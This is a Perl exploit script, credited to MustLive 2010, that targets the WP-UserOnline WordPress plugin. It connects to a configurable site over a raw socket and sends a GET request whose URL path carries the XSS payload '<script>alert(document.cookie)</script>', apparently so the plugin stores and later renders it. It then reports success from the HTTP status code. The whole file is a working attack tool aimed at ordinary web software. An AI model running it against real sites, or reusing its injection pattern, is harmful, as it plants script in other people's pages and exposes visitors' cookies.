#!/usr/bin/perl
# Exploit for WP-UserOnline
# Copyright (C) MustLive 2010
# http://websecurity.com.ua
# Last update: 26.04.2010
##################################################
# Settings
##################################################
my $agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"; # User Agent
my $url = "http://site"; # URL
my $xss = "/?<script>alert(document.cookie)</script>"; # XSS
##################################################
use IO::Socket;

my ($host,$sock,$content,$response);

$url =~ /http:\/\/(.+)\/?/;
$host = $1;
$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "80");
if (!$sock) {
	print "The Socket: $!\n";
	exit();
}
print $sock "GET $xss HTTP/1.1\n";
print $sock "Host: $host\n";
print $sock "User-Agent: $agent\n";
print $sock "Connection: close\n";
print $sock "\n\n";
while (<$sock>) {
	$content .= $_;
}
print "$url - ";
if ($content =~ /HTTP\/.\..\s+(\d+)/) {
	$response = $1;
}
if ($response == 200 or $response == 400) {
	print "OK\n";
}
else {
	print "Error: $response\n";
}

